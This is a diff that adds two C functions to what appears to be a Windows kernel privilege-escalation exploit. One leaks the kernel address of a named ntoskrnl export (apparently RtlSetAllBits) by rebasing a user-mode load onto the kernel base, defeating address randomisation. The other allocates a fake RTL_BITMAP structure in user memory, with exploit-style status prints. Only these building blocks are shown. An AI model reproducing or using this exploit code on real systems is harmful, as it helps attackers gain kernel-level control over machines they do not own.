@@ -168,6 +168,43 @@ PVOID GetKernelModule(const char* DriverName)
     return 0;
 }
 
+DWORD64 LeakGadgetAddress(LPCSTR GadgetName)
+{
+    DWORD64 module_base_kernel, rtlSetAllBits_address;
+    HMODULE module_base_user;
+
+    module_base_user = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (!module_base_user)
+        goto error;
+
+    rtlSetAllBits_address = (DWORD64)GetProcAddress(module_base_user, GadgetName);
+    if (!rtlSetAllBits_address) {
+        goto error;
+    }
+    module_base_kernel = (DWORD64)GetKernelModule("ntoskrnl.exe");
+    rtlSetAllBits_address = module_base_kernel + (rtlSetAllBits_address - (DWORD64)module_base_user);
+
+    return rtlSetAllBits_address;
+
+error:
+    return FALSE;
+}
+
+void* AllocateBitmap(SIZE_T size, LPVOID baseAddress) {
+
+    LPVOID allocatedMemory = VirtualAlloc(baseAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (allocatedMemory == NULL)
+    {
+        printf("[-] AllocateBitmap failed with error: %d\n", GetLastError());
+        return NULL;
+    }
+
+    printf("[+] Fake RTL_BITMAP allocated at address = %p\n", allocatedMemory);
+
+    return allocatedMemory;
+}
+
 bool GetKernelImageInfo(PVOID* pImageAddress, PDWORD pdwImageSize, char* lpszName)
 {
     PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSystemInformation((SYSTEM_INFORMATION_CLASS)11);
